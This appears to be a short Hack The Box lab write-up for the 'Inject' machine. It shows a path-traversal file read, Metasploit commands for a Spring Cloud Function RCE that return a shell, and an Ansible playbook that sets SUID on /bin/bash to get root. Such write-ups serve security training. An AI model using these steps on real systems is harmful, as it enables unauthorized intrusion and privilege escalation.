# HTB - Inject

## Summary

I'm going to keep this writeup pretty brief because I think this is a pretty dumb box. There is an obvious LFI after a file upload, which allows us to get a user's password and learn that the website is using the spring framework. There is a RCE CVE against this framework which we can just use metasploit to exploit. Then, we use the user's password we found from LFI to move laterally, and exploit an Ansible automation task to gain root  

## Recon + LFI

nmap shows `8080` is open as an http proxy and `22` is open for ssh  
Going to `10.10.11.204:8080` takes us to a pretty bare-bones website  
We can run a dirbust against the site with:  
- `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.204:8080`  

This reveals `/uploads` which is a page which allows us to upload .png files. If we send an upload POST request to burp and view the response, included in the response is the path where the image is uploaded to which is `/show-image?image=aaa.png`  
We can just go there and change image= to `../` and we can see that we have an easy LFI. From this LFI we can read a user phil's password and read a config file which tells us that this is using the Spring framework.  

## Spring Exploit

Phil's password does not work for ssh (maybe he doesn't have ssh with password authorized). There is a CVE for the spring framework which we can exploit with metasploit:  
- `use exploit/multi/http/spring_cloud_function_spel_injection`  
- `set target 1`  
- `set lhost tun0`
- `set rhosts 10.10.11.204`
- `run`  

And we get a shell.

## Privesc

We can move laterally to become phil by using his password  
Phil has access to a `/opt/automation/tasks` directory which contains an ansible script `playbook_1.yml`  

We can create our own ansible script called `playbook_2.yml` and put it there, and it will be run  

The purpose of the script is just to add the suid bit to `/bin/bash`  
```ansible
- hosts: localhost
  tasks:
  - name: GetRoot
    command: chmod u+s /bin/bash
    become: true
```  

Then, executing `bash -p` gets us a shell as root  
- We need `-p` so bash does not reset our effective user id  


